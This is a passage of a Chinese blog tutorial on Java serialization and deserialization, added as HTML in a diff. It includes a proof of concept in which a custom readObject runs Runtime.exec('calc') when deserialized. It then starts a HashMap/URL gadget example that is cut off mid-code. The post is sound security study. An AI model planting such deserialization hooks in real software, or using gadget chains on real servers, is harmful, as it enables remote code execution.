@@ -1,0 +1,1179 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java 反序列化学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 反序列化学习">
+<meta property="og:url" content="http://xvshifu.github.io/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="Java 反序列化学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756014.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756302.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756901.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png">
+<meta property="article:published_time" content="2025-08-26T07:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-31T10:21:30.587Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="java 学习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java 反序列化学习 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java 反序列化学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-26 15:00" pubdate>
+          2025年8月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          53 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java 反序列化学习</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年8月31日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Java-反序列化"><a href="#Java-反序列化" class="headerlink" title="Java 反序列化"></a>Java 反序列化</h1><h1 id="1、序列化与反序列化"><a href="#1、序列化与反序列化" class="headerlink" title="1、序列化与反序列化"></a>1、序列化与反序列化</h1><h2 id="1-1-什么是序列化-反序列化"><a href="#1-1-什么是序列化-反序列化" class="headerlink" title="1.1 什么是序列化&amp;反序列化"></a>1.1 什么是序列化&amp;反序列化</h2><p>序列化：将内存中的对象压缩成字节流<br>反序列化：将字节流转化成内存中的对象</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="1-2-为什么有序列化技术"><a href="#1-2-为什么有序列化技术" class="headerlink" title="1.2 为什么有序列化技术"></a>1.2 为什么有序列化技术</h2><p>序列化与反序列化的设计就是用来传输数据的。</p>
+<p><strong>应用场景</strong><br>(1) 想把内存中的对象保存到一个文件中或者是数据库当中。<br>(2) 用套接字在网络上传输对象。<br>(3) 通过RMI传输对象的时候。</p>
+<h2 id="1-3-几种常见的序列化和反序列化协议"><a href="#1-3-几种常见的序列化和反序列化协议" class="headerlink" title="1.3 几种常见的序列化和反序列化协议"></a>1.3 几种常见的序列化和反序列化协议</h2><ul>
+<li>XML</li>
+<li>SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</li>
+<li>JSON（Javascript Object Notation）</li>
+<li>Protobuf</li>
+</ul>
+<h2 id="1-4-序列化和反序列化实现"><a href="#1-4-序列化和反序列化实现" class="headerlink" title="1.4 序列化和反序列化实现"></a>1.4 序列化和反序列化实现</h2><p>简单分析 Java 的对象序列化的不同写法：</p>
+<p>俩种写法本质上都是 Java 的对象序列化，但它们在底层的 IO 流使用方式上略有不同：</p>
+<p><strong>写法一：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));<br></code></pre></td></tr></table></figure>
+
+<p>传统的基于字节流的文件写入方式：FileOutputStream(“ser.bin”)， 创建一个 <code>FileOutputStream</code>，表示要写入的目标文件是 <code>ser.bin</code></p>
+<p>特点：</p>
+<ul>
+<li>简单直接，兼容性很好，Java 早期版本就有。</li>
+<li>对路径和文件名使用的是 <strong>字符串形式</strong>。</li>
+</ul>
+<p><strong>写法二：（IDEA推荐）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));<br></code></pre></td></tr></table></figure>
+
+<p><code>**Paths.get(&quot;ser.bin&quot;)**</code></p>
+<ul>
+<li>使用 <code>java.nio.file.Path</code> 来表示文件路径，比 <code>String</code> 更灵活、可组合。</li>
+<li>可以方便地处理跨平台路径，比如 <code>&quot;folder/subfolder/file.txt&quot;</code></li>
+</ul>
+<p><code>**Files.newOutputStream(path)**</code></p>
+<ul>
+<li>返回一个 <code>OutputStream</code>，功能类似 <code>FileOutputStream</code>。</li>
+<li>基于 NIO（New IO）库，提供更多文件操作选项，</li>
+</ul>
+<p>特点：</p>
+<ul>
+<li>更现代化的写法，灵活性高，支持 NIO 的各种特性。</li>
+<li>更适合与 <code>Path</code>、<code>Files</code> API 配合，比如检查文件是否存在、创建目录等。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">//定义一个 Person 类，并声明它实现了 Serializable 接口,这样 Person 的对象就可以被序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">//私有成员变量</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//无参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">//有参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">//重写 toString() 方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Serialization</span> &#123;<br><br>    <span class="hljs-comment">//定义一个静态方法 serialize(Object obj)，接收一个对象并把它序列化到文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// ObjectOutputStream：包装文件输出流，使其支持写对象</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<br>            <span class="hljs-comment">// Files.newOutputStream(...)：创建一个输出流，写入到 ser.bin 文件</span><br>            <span class="hljs-comment">// Paths.get(&quot;ser.bin&quot;)：得到一个路径对象，表示当前项目目录下的 ser.bin 文件</span><br>            Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;ser.bin&quot;</span>))<br>        );<br>        <span class="hljs-comment">//oos.writeObject(obj)：把传入的 obj 写到文件里（前提是对象必须实现 Serializable 接口）</span><br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">11</span>);<br>        System.out.println(person);<br>        <span class="hljs-comment">//把这个 person 对象写入 ser.bin 文件</span><br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br><br>    <span class="hljs-comment">//定义一个静态方法 unserialize，接收序列化后的二进制文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//new ObjectInputStream(...)：包装成对象输入流，这样可以直接读取对象</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<br>            <span class="hljs-comment">// Files.newInputStream(Paths.get(filename))：创建一个输入流，指向 filename 文件</span><br>            Files.newInputStream(Paths.get(filename))<br>        );<br>        <span class="hljs-comment">//ois.readObject()：从文件中读取对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//调用 unserialize(&quot;ser.bin&quot;)，从 ser.bin 文件里反序列化得到一个对象，强制转换为 Person 类型</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:#080808;background-color:#ffffff;">Serialization 创建 Person 对象并将其序列化保存到文件 ser.bin</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png" srcset="/img/loading.gif" lazyload></p>
+<p>生成的 <font style="color:#080808;background-color:#ffffff;"> ser.bin </font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#080808;background-color:#ffffff;">Unserialize  从 ser.bin 文件里恢复（反序列化）一个对象  </font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>总的来说：</strong></p>
+<p> 在 <code>serialize</code> 方法中，先通过输出流对象 <code>new FileOutputStream(&quot;ser.bin&quot;)</code>【等价于 <code>Files.newOutputStream(Paths.get(&quot;ser.bin&quot;))</code>】创建文件输出通道，然后将输出流包装成 <code>ObjectOutputStream</code>，再调用 <code>writeObject</code> 方法将对象序列化并写入文件。</p>
+<p> 在 <code>unserialize</code> 方法中，先通过输入流对象 <code>new FileInputStream(&quot;ser.bin&quot;)</code>【等价于 <code>Files.newInputStream(Paths.get(&quot;ser.bin&quot;))</code>】创建文件输入通道，然后将输入流包装成 <code>ObjectInputStream</code>，再调用 <code>readObject</code> 方法将文件中的二进制数据读取出来并反序列化成对象。  </p>
+<h2 id="1-5-为什么会产生安全问题？"><a href="#1-5-为什么会产生安全问题？" class="headerlink" title="1.5 为什么会产生安全问题？"></a>1.5 为什么会产生安全问题？</h2><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p>
+<ol>
+<li><font style="color:rgb(51, 51, 51);">入口类的</font><code>&lt;font style=&quot;color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);&quot;&gt;readObject&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">直接调用危险方法</font></li>
+<li><font style="color:rgb(51, 51, 51);">入口参数中包含可控类，该类有危险方法，readObject 时调用</font></li>
+<li><font style="color:rgb(51, 51, 51);">入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font></li>
+<li><font style="color:rgb(51, 51, 51);">构造函数&#x2F;静态代码块等类加载时隐式执行</font></li>
+</ol>
+<h3 id="1-5-1-入口类的-readObject-直接调用危险方法"><a href="#1-5-1-入口类的-readObject-直接调用危险方法" class="headerlink" title="1.5.1 入口类的 readObject 直接调用危险方法"></a>1.5.1 入口类的 <code>readObject</code> 直接调用危险方法</h3><p>Person 类中写入：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">//调用默认的反序列化过程</span><br>    ois.defaultReadObject();<br>    <span class="hljs-comment">//执行了一个系统命令</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p> 反序列化时 JVM 会先调用 Person 类中自定义的 <code>readObject</code> 方法，而其中加入了命令执行逻辑，因此对象恢复过程中就触发了计算器的运行。  </p>
+<p>依次执行序列化、反序列化，弹出计算器：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="1-5-2-入口参数中包含可控类，该类有危险方法，readObject-时调用"><a href="#1-5-2-入口参数中包含可控类，该类有危险方法，readObject-时调用" class="headerlink" title="1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用"></a>1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用</h3><p>为什么HashMap要自己实现writeObject和readObject方法？</p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test01</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL, Integer&gt; hash = <span 